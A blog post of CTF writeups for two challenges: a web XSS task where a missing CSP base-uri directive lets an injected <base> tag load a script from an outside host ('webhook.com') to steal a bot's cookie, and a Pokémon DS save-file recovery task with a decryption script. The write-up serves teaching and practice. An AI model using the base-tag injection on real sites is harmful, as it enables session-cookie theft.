<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <title>Writeups of my challenges at K!nd4SUS CTF</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">


  
  <link rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets@11.9.0/styles/github-dark.min.css">

  
  <link rel="stylesheet" href="../../static/css/common.css">

 
  <link rel="stylesheet" href="../../static/css/pages.css">
</head>

<body>
  <header>
    <nav class="main-nav">
      <ul>
        <li><a href="../../index.html">Home</a></li>
        <li><a href="../posts-page-1.html" aria-current="page">Blog</a></li>
        <li><a href="../../cv.pdf">CV</a></li>
      </ul>
    </nav>
  </header>
  
  
  <main class="post-wrapper">
    <h1 class="post-title">Writeups of my challenges at K!nd4SUS CTF</h1>
    <div class="post-meta">
      <span><i class="fa-regular fa-calendar"></i>March 18, 2025</span>
      
    </div>

    <figure>
      <img src="../../static/images/K!nd4.png" alt="SAS CTF banner" style="width: 9rem; height: auto;">
    </figure>
    <article class="post-content">
    <p>Last week, I had the opportunity to organize together with the other K!nd4SUS members, the first edition of the <code>K!nd4SUS CTF</code> where I contributed by creating two challenges in the Web and Misc categories.</p>
    <p>Below you can find the writeups for these two challenges.</p>
     <h2>Cloud Recipe (Web)</h2>
      <hr>
      <p>The website allows a user to register and create cooking recipes to save on their profile.</p>
      <p>There is also a feature that allows a user to send a recipe to a bot and the bot's cookie contains the flag, this should immediately suggest that the challenge is <strong>XSS-related.</strong></p>
      <p>We can notice that some fields are inserted into the page without any sanitization when a recipe is created.</p>
      <pre><code class="language-html">{% extends &quot;base.html&quot; %}

{% block title %}
  {% autoescape false %}
    {{ recipe['title'] }} - Cloud Recipe
  {% endautoescape %}
{% endblock %}

{% block content %}
  {% autoescape false %}
    &lt;h1&gt;{{ recipe['title'] }}&lt;/h1&gt;
    &lt;p class=&quot;description&quot;&gt;{{ recipe['description'] }}&lt;/p&gt;
  {% endautoescape %}

  {% if recipe['photo'] %}
    &lt;img src=&quot;{{ url_for('uploaded_file', filename=recipe['photo']) }}&quot; alt=&quot;Recipe photo&quot; style=&quot;max-width: 100%; border-radius: 10px;&quot;&gt;
  {% endif %}

  &lt;p&gt;&lt;a href=&quot;{{ url_for('recipes') }}&quot;&gt;Back to your recipes&lt;/a&gt;&lt;/p&gt;

  &lt;script nonce=&quot;{{ csp_nonce() }}&quot; src=&quot;{{ url_for('static', filename='js/image.js') }}&quot;&gt;&lt;/script&gt;
{% endblock %}
</code></pre>
<p>It would seem like an easy XSS if it weren’t for the fact that the site has a CSP that blocks any inline scripts that don’t have a nonce.</p>
<pre><code class="language-python">csp = {
    'script-src': '',    
    'style-src': ["'self'"],       
    'default-src': ['*']
}

Talisman(app,
         force_https=False,
         session_cookie_secure=False,
         content_security_policy=csp,
         content_security_policy_nonce_in=['script-src', 'style-src']
)
</code></pre>
<p>With some research we can discover that there's a directive called <code>base-uri</code> that restricts the URLs which can be used in a document's <code>&lt;base&gt;</code> element, and in our CSP is not present.</p>
<p>It would seem useless if not for the fact that the script included in the page specifies only a relative path, not an absolute one.</p>
<pre><code class="language-html">&lt;script nonce=&quot;{{ csp_nonce() }}&quot; src=&quot;{{ url_for('static', filename='js/image.js') }}&quot;&gt;&lt;/script&gt;
</code></pre>
<p> This allows us to insert a <code>&lt;base&gt;</code> tag to modify the URL from which it gets loaded.</p>
<p>So, what we need to do is host a malicious JavaScript payload on our server that allows us to steal the bot's cookie, then we insert a &lt;base&gt; tag pointing to our server in the recipe description, finally we have the bot visit our recipe and the script will be loaded from our server, completing the challenge.</p>
<p>Poc:</p>
<pre><code class="language-html">&lt;base href=&quot;https://webhook.com/static/file.js&quot;&gt;
</code></pre>

<h2>Gotta Dump 'Em All (Misc)</h2>
<hr>
<p>We are given a <code>.sav</code> file as an attachment which is a save file for the Nintendo DS.</p>
<p>The challenge description asks us to retrieve the names of the Pokémon that the trainer has lost.</p>
<p>If we try to load the file into tools that allow viewing and editing Pokémon save files, we notice that only a Chimchar is present that is not the Pokemon we are looking for.</p>
<p>With a bit of research it's easy to discover that Pokémon save files create a <code>backup block</code> each time the game is saved, in case the current save file becomes corrupted.
<p>The Pokémon we are looking for, in fact, are located in that very backup block.</p>
<p>By reading <a href="https://projectpokemon.org/home/docs/gen-4/pkm-structure-r65/" target="_blank">this</a> guide, it's possible to see the algorithm the game uses to save information, so we just need to follow those steps to recover the names of the Pokémon.</p>
<p>The final script to solve the challenge is this one.</p>
<pre><code class="language-python">import struct

def get_block_order(pv):
    &quot;&quot;&quot;
    Calculates the block order (shuffling) based on the Personality Value.
    Returns a list of 4 elements indicating how the 4 blocks have been shuffled.
    &quot;&quot;&quot;
    order = ((pv &amp; 0x3E000) &gt;&gt; 0xD) % 24
    block_orders = [
        [0, 1, 2, 3], [0, 1, 3, 2], [0, 2, 1, 3], [0, 3, 1, 2],
        [0, 2, 3, 1], [0, 3, 2, 1], [1, 0, 2, 3], [1, 0, 3, 2],
        [2, 0, 1, 3], [3, 0, 1, 2], [2, 0, 3, 1], [3, 0, 2, 1],
        [1, 2, 0, 3], [1, 3, 0, 2], [2, 1, 0, 3], [3, 1, 0, 2],
        [2, 3, 0, 1], [3, 2, 0, 1], [1, 2, 3, 0], [1, 3, 2, 0],
        [2, 1, 3, 0], [3, 1, 2, 0], [2, 3, 1, 0], [3, 2, 1, 0]
    ]
    return block_orders[order]

def compute_inverse_order(order):
    &quot;&quot;&quot;
    Computes the inverse permutation of the given order.
    For example, if the order is [2, 0, 3, 1], the inverse will be [1, 3, 0, 2].
    &quot;&quot;&quot;
    inverse = [0] * len(order)
    for i, val in enumerate(order):
        inverse[val] = i
    return inverse

def prng(seed):
    &quot;&quot;&quot;
    Generates the next state of the PRNG (32-bit LCG).
    The &quot;&amp; 0xFFFFFFFF&quot; operation is used to simulate 32-bit overflow.
    &quot;&quot;&quot;
    return (0x41C64E6D * seed + 0x6073) &amp; 0xFFFFFFFF

def decrypt_data(data, checksum):
    &quot;&quot;&quot;
    Decrypts the 128 encrypted bytes (offset 0x08-0x87) of the structure.
    The encrypted data is treated as a continuous stream of 64 16-bit words.
    NOTE: We use little-endian format here, as in your code.
    &quot;&quot;&quot;
    decrypted = bytearray()
    rng = checksum  # Initial PRNG seed
    for i in range(0, len(data), 2):
        rng = prng(rng)
        key = (rng &gt;&gt; 16) &amp; 0xFFFF
        # Reads 2 bytes in little-endian (following your example)
        word = struct.unpack_from('&lt;H', data, i)[0]
        decrypted_word = word ^ key
        decrypted.extend(struct.pack('&lt;H', decrypted_word))
    return decrypted

def unshuffle_data(decrypted_data, inverse_order):
    &quot;&quot;&quot;
    Splits the 128 decrypted bytes into 4 blocks of 32 bytes each
    and reorders them according to the inverse permutation,
    restoring the logical order (A, B, C, D).
    &quot;&quot;&quot;
    blocks = [decrypted_data[i*32:(i+1)*32] for i in range(4)]
    unshuffled_blocks = [None] * 4
    for j in range(4):
        unshuffled_blocks[j] = blocks[inverse_order[j]]
    return b''.join(unshuffled_blocks)

def extract_nickname(unshuffled_data):
    &quot;&quot;&quot;
    Extracts the nickname from the decrypted block.
    The nickname starts at offset 0x40, occupies at most 11 characters (22 bytes),
    and the string ends with 0xffff.
    The function returns a list of 16-bit (integer) raw hex values.
    &quot;&quot;&quot;
    # Extracts the 22 bytes starting from offset 0x40
    nick_data = unshuffled_data[0x40:0x40+22]
    nickname = []
    # Reads each character (2 bytes, little-endian)
    for i in range(0, len(nick_data), 2):
        char_val = struct.unpack_from('&lt;H', nick_data, i)[0]
        # If we find the terminator 0xffff, exit
        if char_val == 0xffff:
            break
        nickname.append(char_val)
    return nickname

def process_party_block(filename, base_offset, party_count=6):
    &quot;&quot;&quot;
    Processes a party Pok&eacute;mon block, starting from 'base_offset'.
    For each Pok&eacute;mon (236-byte structure), extracts and prints the nickname in raw hex.
    &quot;&quot;&quot;
    try:
        with open(filename, &quot;rb&quot;) as f:
            for i in range(party_count):
                offset = base_offset + i * 236
                f.seek(offset)
                data = f.read(236)
                if len(data) &lt; 236:
                    # If there isn't enough data, stop
                    break

                # The first 8 bytes are unencrypted: 0x00-0x07
                personality_value = struct.unpack_from('&lt;I', data, 0)[0]
                checksum = struct.unpack_from('&lt;H', data, 6)[0]

                # The 128 encrypted bytes are from 0x08 to 0x87
                encrypted_data = data[8:136]
                decrypted_data = decrypt_data(encrypted_data, checksum)

                # Compute the block order and unshuffle the 128 bytes
                block_order = get_block_order(personality_value)
                inverse_order = compute_inverse_order(block_order)
                unshuffled_data = unshuffle_data(decrypted_data, inverse_order)

                # Extract the nickname (from offset 0x40 for 22 bytes, terminated by 0xffff)
                nickname_chars = extract_nickname(unshuffled_data)
                print(f&quot;Pokemon {i+1} (offset 0x{offset:05x}) nickname:&quot;)
                for char in nickname_chars:
                    print(f&quot;{char:04x}&quot;)
                print()  # Blank line to separate Pok&eacute;mon

    except FileNotFoundError:
        print(f&quot;File '{filename}' not found.&quot;)

def main():
    filename = &quot;game.sav&quot;
    print(&quot;=== First party block (offset 0x00098) ===&quot;)
    process_party_block(filename, 0x00098)
    print(&quot;=== Second party block (offset 0x40098) ===&quot;)
    process_party_block(filename, 0x40098)

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<P>For some reason some of the offsets listed in the guide were incorrect, however, it's enough to shift some information by a few bytes to fix it.</p>
    </article>
</main>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
	<script>hljs.highlightAll();</script>
</body>
</html>
